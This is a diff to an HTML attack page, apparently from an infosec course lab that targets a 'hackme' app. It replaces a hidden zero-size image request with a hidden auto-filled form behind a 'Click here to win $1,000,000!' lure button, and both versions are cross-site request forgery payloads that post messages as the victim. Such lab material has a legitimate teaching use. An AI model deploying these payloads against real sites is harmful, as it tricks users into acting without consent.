@@ -6,6 +6,10 @@
 	</head>
 	<body>
 		<h1>Having a nice day?</h1>
-		<img height="0" width="0" src="http://infosec-020-104/hackme/post.php?title='You won!'&message='You have been selected for a free flying dragon ride.'" />
+		<form action="http://infosec-020-104/hackme/post.php">
+			<input type="hidden" name="title" value="You won!">
+			<input type="hidden" name="message" value="You have been selected for a free flying dragon ride.">
+			<input type="submit" value="Click here to win $1,000,000!">
+		</form>
 	</body>
 </html>
